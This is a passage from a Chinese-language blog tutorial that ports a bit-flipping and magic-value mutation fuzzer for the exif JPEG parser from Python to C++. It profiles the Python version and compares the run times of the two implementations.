<span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data</code></pre><p>诚然，这个函数有点笨拙，我们可以用更好的逻辑来大大简化它，我发现在我有限的编程经历中经常会出现下面这种情况，你尽可以用你想要的所有花哨的深奥的编程知识，但是如果你编程背后的逻辑是不健全的，那么程序的性能就会受到影响。</p><p>让我们减少我们所做的类型转换的数量，例如从<code>int</code>转成<code>str</code>或者反过来，让我们在编译器中用更少的代码，我们可以通过重新定义的<code>bit_flip()</code>完成我们想要的，如下所示：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    length = len(data) - <span class="hljs-number">4</span>    num_of_flips = int(length * <span class="hljs-number">.01</span>)    picked_indexes = []        flip_array = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">32</span>,<span class="hljs-number">64</span>,<span class="hljs-number">128</span>]    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        picked_indexes.append(random.choice(range(<span class="hljs-number">0</span>,length)))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> picked_indexes:        mask = random.choice(flip_array)        data[x] = data[x] ^ mask    <span class="hljs-keyword">return</span> data</code></pre><p>如果我们使用这个新的函数并监控结果，我们将获得以下的性能等级：</p><pre><code class="hljs yaml"><span class="hljs-number">59376275</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(59376138</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">135.582</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">15</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">135.582</span>  <span class="hljs-number">135.582</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">1.940</span>    <span class="hljs-number">1.940</span>  <span class="hljs-number">135.582</span>  <span class="hljs-number">135.582</span> <span class="hljs-string">subpro.py:3(&lt;module&gt;)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.978</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">107.857</span>    <span class="hljs-number">0.002</span> <span class="hljs-string">subpro.py:111(exif)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.450</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">64.236</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:681(__init__)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">5.566</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">60.141</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1412(_execute_child)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.534</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">42.259</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:920(communicate)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">2.827</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">41.637</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1662(_communicate)</span>   <span class="hljs-number">199549</span>   <span class="hljs-number">38.249</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">38.249</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;   <span class="hljs-number">149537</span>    <span class="hljs-number">0.555</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">30.376</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:402(select)</span>   <span class="hljs-number">149537</span>   <span class="hljs-number">29.722</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">29.722</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;poll&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;select.poll&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">3.993</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">14.471</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:14(bit_flip)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.741</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">10.316</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:256(choice)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">9.973</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.973</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">_posixsubprocess.fork_exec</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.163</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.034</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:105(create_new)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.987</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">5.952</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:224(_randbelow)</span>   <span class="hljs-number">202567</span>    <span class="hljs-number">4.966</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.966</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">io.open</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">4.042</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">4.042</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedRandom&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.539</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.828</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:617(get_exec_path)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.843</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">3.607</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:8(get_bytes)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.074</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.133</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1014(wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.463</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.059</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1621(_wait)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.274</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">2.046</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:351(register)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">0.782</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.702</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:234(register)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.055</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.507</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1608(_try_wait)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">1.452</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.452</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.waitpid</span>&#125;   <span class="hljs-number">350000</span>    <span class="hljs-number">0.424</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.436</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subprocess.py:1471(&lt;genexpr&gt;)</span> <span class="hljs-number">12066317</span>    <span class="hljs-number">1.339</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.339</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;getrandbits&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span> <span class="hljs-string">objects</span>&#125;   <span class="hljs-number">100000</span>    <span class="hljs-number">0.466</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.048</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">os.py:674(__getitem__)</span>   <span class="hljs-number">100000</span>    <span class="hljs-number">1.014</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">1.014</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;close&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;_io.BufferedReader&#x27;</span> <span class="hljs-string">objects</span>&#125;<span class="hljs-string">-----SNIP-----</span></code></pre><p>从指标中可以看出，此时我们在<code>bit_flip()</code>中只花了14秒的累计时间！在我们最后一轮中，这个将近花费了25秒，在这一点上，这几乎是两倍的速度了，在我看来，我们在这里的优化工作做得很好。</p><p>现在我们有了我们理想的<code>Python</code>基准测试（请记住，这里可能会有多进程或多线程的机会，但我们把这个想法留在下次），让我们继续把我们的<code>fuzzer</code>移植到一个新的语言<code>c++</code>，并测试其性能。</p><h2 id="New-Fuzzer-in-C"><a href="#New-Fuzzer-in-C" class="headerlink" title="New Fuzzer in C++"></a>New Fuzzer in C++</h2><p>首先，让我们继续运行我们新优化的<code>python fuzzer</code>，并将其运行<code>100k</code>次<code>fuzzing</code>迭代，看看需要多长时间。</p><p><code>118749892 function calls (118749755 primitive calls) in 256.881 seconds</code></p><p>100k次迭代仅需256s！这性能摧毁了我们之前写的<code>fuzzer</code></p><p>这将是我们用<code>c++</code>实现尝试要打败的基准测试，现在，就像我对<code>Python</code>开发的细微点的不熟悉程度，将其乘十，你就会发现，我对<code>c++</code>不熟悉的程度了，这段代码或许会贻笑大方，但是这是我目前能做的最好的，我们可以对应我们之前的<code>Python</code>代码解释每个函数。</p><p>让我们逐个函数来看看，然后描述其实现</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// this function simply creates a stream by opening a file in binary mode;</span><span class="hljs-comment">// finds the end of file, creates a string &#x27;data&#x27;, resizes data to be the same</span><span class="hljs-comment">// size as the file moves the file pointer back to the beginning of the file;</span><span class="hljs-comment">// reads the data from the into the data string;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">get_bytes</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-function"><span class="hljs-built_in">std</span>::ifstream <span class="hljs-title">fin</span><span class="hljs-params">(filename, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;    <span class="hljs-keyword">if</span> (fin.is_open())    &#123;        fin.seekg(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::<span class="hljs-built_in">end</span>);        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data;        data.resize(fin.tellg());        fin.seekg(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);        fin.<span class="hljs-built_in">read</span>(&amp;data[<span class="hljs-number">0</span>], data.<span class="hljs-built_in">size</span>());        <span class="hljs-keyword">return</span> data;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to open &quot;</span> &lt;&lt; filename &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;&#125;</code></pre><p>这个函数如我的注释所写，仅从我们的目标文件中检索一个字节的串，在我们的测试情况下，这个文件仍将为<code>Canon_40D.jpg</code></p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// this will take 1% of the bytes from our valid jpeg and</span><span class="hljs-comment">// flip a random bit in the byte and return the altered string</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">bit_flip</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data)</span></span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> = (data.length() - <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> num_of_flips = (<span class="hljs-keyword">int</span>)(<span class="hljs-built_in">size</span> * <span class="hljs-number">.01</span>);    <span class="hljs-comment">// get a vector full of 1% of random byte indexes</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; picked_indexes;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; num_of_flips; i++)    &#123;        <span class="hljs-keyword">int</span> picked_index = rand() % <span class="hljs-built_in">size</span>;        picked_indexes.push_back(picked_index);    &#125;    <span class="hljs-comment">// iterate through the data string at those indexes and flip a bit</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; picked_indexes.<span class="hljs-built_in">size</span>(); ++i)    &#123;        <span class="hljs-keyword">int</span> index = picked_indexes[i];        <span class="hljs-keyword">char</span> current = data.at(index);        <span class="hljs-keyword">int</span> decimal = ((<span class="hljs-keyword">int</span>)current &amp; <span class="hljs-number">0xff</span>);                <span class="hljs-keyword">int</span> bit_to_flip = rand() % <span class="hljs-number">8</span>;                decimal ^= <span class="hljs-number">1</span> &lt;&lt; bit_to_flip;        decimal &amp;= <span class="hljs-number">0xff</span>;                data[index] = (<span class="hljs-keyword">char</span>)decimal;    &#125;    <span class="hljs-keyword">return</span> data;&#125;</code></pre><p>这个函数直接等同于我们<code>Python</code>脚本中的<code>bit_flip()</code>函数</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// takes mutated string and creates new jpeg with it;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">create_new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout</span><span class="hljs-params">(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;    <span class="hljs-keyword">if</span> (fout.is_open())    &#123;        fout.seekp(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);        fout.<span class="hljs-built_in">write</span>(&amp;mutated[<span class="hljs-number">0</span>], mutated.<span class="hljs-built_in">size</span>());    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to create mutated.jpg&quot;</span> &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;&#125;</code></pre><p>这个函数将简单地创建一个<code>mutated.jpg</code>文件，跟我们<code>Python</code>脚本中的<code>create_new()</code>函数类似</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// function to run a system command and store the output as a string;</span><span class="hljs-comment">// https://www.jeremymorgan.com/tutorials/c-programming/how-to-capture-the-output-of-a-linux-command-in-c/</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">get_output</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> cmd)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> output;    FILE * stream;    <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[<span class="hljs-number">256</span>];    stream = popen(cmd.c_str(), <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">if</span> (stream)    &#123;        <span class="hljs-keyword">while</span> (!feof(stream))            <span class="hljs-keyword">if</span> (fgets(<span class="hljs-built_in">buffer</span>, <span class="hljs-number">256</span>, stream) != <span class="hljs-literal">NULL</span>) output.append(<span class="hljs-built_in">buffer</span>);                pclose(stream);    &#125;    <span class="hljs-keyword">return</span> output;&#125;<span class="hljs-comment">//</span><span class="hljs-comment">// we actually run our exiv2 command via the get_output() func;</span><span class="hljs-comment">// retrieve the output in the form of a string and then we can parse the string;</span><span class="hljs-comment">// we&#x27;ll save all the outputs that result in a segfault or floating point except;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">exif</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated, <span class="hljs-keyword">int</span> counter)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> command = <span class="hljs-string">&quot;exif mutated.jpg -verbose 2&gt;&amp;1&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> output = get_output(command);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> segfault = <span class="hljs-string">&quot;Segmentation&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> floating_point = <span class="hljs-string">&quot;Floating&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> pos1 = output.<span class="hljs-built_in">find</span>(segfault);    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> pos2 = output.<span class="hljs-built_in">find</span>(floating_point);    <span class="hljs-keyword">if</span> (pos1 != <span class="hljs-number">-1</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Segfault!\n&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">ostringstream</span> oss;        oss &lt;&lt; <span class="hljs-string">&quot;/root/cppcrashes/crash.&quot;</span> &lt;&lt; counter &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename = oss.str();        <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout</span><span class="hljs-params">(filename, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;        <span class="hljs-keyword">if</span> (fout.is_open())            &#123;                fout.seekp(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);                fout.<span class="hljs-built_in">write</span>(&amp;mutated[<span class="hljs-number">0</span>], mutated.<span class="hljs-built_in">size</span>());            &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to create &quot;</span> &lt;&lt; filename &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span> &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);        &#125;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pos2 != <span class="hljs-number">-1</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Floating Point!\n&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">ostringstream</span> oss;        oss &lt;&lt; <span class="hljs-string">&quot;/root/cppcrashes/crash.&quot;</span> &lt;&lt; counter &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename = oss.str();        <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fout</span><span class="hljs-params">(filename, <span class="hljs-built_in">std</span>::ios::binary)</span></span>;        <span class="hljs-keyword">if</span> (fout.is_open())            &#123;                fout.seekp(<span class="hljs-number">0</span>, <span class="hljs-built_in">std</span>::ios::beg);                fout.<span class="hljs-built_in">write</span>(&amp;mutated[<span class="hljs-number">0</span>], mutated.<span class="hljs-built_in">size</span>());            &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Failed to create &quot;</span> &lt;&lt; filename &lt;&lt; <span class="hljs-string">&quot;.jpg&quot;</span> &lt;&lt; <span class="hljs-string">&quot;.\n&quot;</span>;            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);        &#125;    &#125;&#125;</code></pre><p>这两个函数一起工作，<code>get_output</code>函数接收一个<code>C++</code>字符串作为参数，将在操作系统上运行该命令并捕获输出，然后，该函数将输出作为一个字符串返回给调用函数<code>exif()</code></p><p><code>exif()</code>将拿到输出并寻找<code>Segmentation fault</code>或<code>Floating point exception</code>错误，如果发现这些输出，就把这些字节写入一个文件并保存为<code>crash.&lt;counter&gt;.jpg</code>文件，与我们的<code>Python fuzzer</code>非常相似。</p><pre><code class="hljs c++"><span class="hljs-comment">//</span><span class="hljs-comment">// simply generates a vector of strings that are our &#x27;magic&#x27; values;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">vector_gen</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; magic;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>::string_literals;    magic.push_back(<span class="hljs-string">&quot;\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x7f&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\xff\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x7f\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x00\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\xff\xff\xff\xff&quot;</span>);    magic.push_back(<span class="hljs-string">&quot;\x80\x00\x00\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\x40\x00\x00\x00&quot;</span>s);    magic.push_back(<span class="hljs-string">&quot;\x7f\xff\xff\xff&quot;</span>);    <span class="hljs-keyword">return</span> magic;&#125;<span class="hljs-comment">//</span><span class="hljs-comment">// randomly picks a magic value from the vector and overwrites that many bytes in the image;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">magic</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; magic)</span></span><span class="hljs-function"></span>&#123;        <span class="hljs-keyword">int</span> vector_size = magic.<span class="hljs-built_in">size</span>();    <span class="hljs-keyword">int</span> picked_magic_index = rand() % vector_size;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> picked_magic = magic[picked_magic_index];    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> = (data.length() - <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> picked_data_index = rand() % <span class="hljs-built_in">size</span>;    data.replace(picked_data_index, magic[picked_magic_index].length(), magic[picked_magic_index]);    <span class="hljs-keyword">return</span> data;&#125;<span class="hljs-comment">//</span><span class="hljs-comment">// returns 0 or 1;</span><span class="hljs-comment">//</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func_pick</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">int</span> result = rand() % <span class="hljs-number">2</span>;    <span class="hljs-keyword">return</span> result;&#125;</code></pre><p>这些函数与我们的<code>Python</code>实现也很相似，<code>vector_gen()</code>几乎只是创建了我们的<code>magic value</code>的<code>vector</code>，然后像<code>magic()</code>这样的后续函数使用该<code>vector</code>随机选择一个<code>index</code>，并用相应的变异数据覆盖有效<code>jpeg</code>中的数据。</p><p><code>func_pick()</code>非常简单，只是返回一个0或一个1，这样我们的<code>fuzzer</code>就可以随机地选择<code>bit_flip()</code>或<code>magic()</code>来变异我们的有效的<code>jpeg</code>文件，为了保持一致性，让我们的<code>fuzzer</code>暂时只选择<code>bit_flip()</code>，在我们的程序中添加一行临时的<code>function = 1</code>，这样我们就能与我们的<code>Python</code>测试相匹配了</p><p>下面就是我们的<code>main()</code>函数，它执行了我们到目前为止的所有代码：</p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Usage: ./cppfuzz &lt;valid jpeg&gt; &lt;number_of_fuzzing_iterations&gt;\n&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Usage: ./cppfuzz Canon_40D.jpg 10000\n&quot;</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-comment">// start timer</span>    <span class="hljs-keyword">auto</span> start = <span class="hljs-built_in">std</span>::chrono::high_resolution_clock::now();    <span class="hljs-comment">// initialize our random seed</span>    srand((<span class="hljs-keyword">unsigned</span>)time(<span class="hljs-literal">NULL</span>));    <span class="hljs-comment">// generate our vector of magic numbers</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; magic_vector = vector_gen();    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename = argv[<span class="hljs-number">1</span>];    <span class="hljs-keyword">int</span> iterations = atoi(argv[<span class="hljs-number">2</span>]);    <span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (counter &lt; iterations)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data = get_bytes(filename);        <span class="hljs-keyword">int</span> function = func_pick();        function = <span class="hljs-number">1</span>;        <span class="hljs-keyword">if</span> (function == <span class="hljs-number">0</span>)        &#123;            <span class="hljs-comment">// utilize the magic mutation method; create new jpg; send to exiv2</span>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated = magic(data, magic_vector);            create_new(mutated);            exif(mutated,counter);            counter++;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">// utilize the bit flip mutation; create new jpg; send to exiv2</span>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated = bit_flip(data);            create_new(mutated);            exif(mutated,counter);            counter++;        &#125;    &#125;    <span class="hljs-comment">// stop timer and print execution time</span>    <span class="hljs-keyword">auto</span> <span class="hljs-built_in">stop</span> = <span class="hljs-built_in">std</span>::chrono::high_resolution_clock::now();    <span class="hljs-keyword">auto</span> duration = <span class="hljs-built_in">std</span>::chrono::duration_cast&lt;<span class="hljs-built_in">std</span>::chrono::milliseconds&gt;(<span class="hljs-built_in">stop</span> - start);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Execution Time: &quot;</span> &lt;&lt; duration.count() &lt;&lt; <span class="hljs-string">&quot;ms\n&quot;</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>我们从命令行参数中得到一个有效的<code>JPEG</code>进行变异和<code>fuzzing</code>迭代的次数，我们用<code>std::chrono</code>命名空间建立了一些计时机制，以计时我们的程序需要运行多长时间。</p><p>我们在这里只选择<code>bit_flip()</code>类型的变异是一种作弊，但是这要是我们在<code>Python</code>所做地一样，所以我们想要的一种公平地比较。</p><p>让我们继续然后运行它进行<code>100k</code>次迭代，并且与<code>Python fuzzer</code>基准测试<code>256s</code>进行比较。</p><p>当我们运行<code>C++ fuzzer</code>时，我们得到了一个用毫秒为单位的打印时间：<code>Execution Time: 172638ms</code> 相当于 <code>172s</code></p><p>因此，我们用我们新的<code>C++ fuzzer</code>轻松地摧毁了我们的<code>Python fuzzer</code>！让我们继续在这里做一些算数运算<code>172/256 = 67%</code>，因此我们用<code>C++</code>实现的速度大约是快了<code>33%</code></p><p>让我们带着我们优化过的<code>Python</code>和<code>C++ 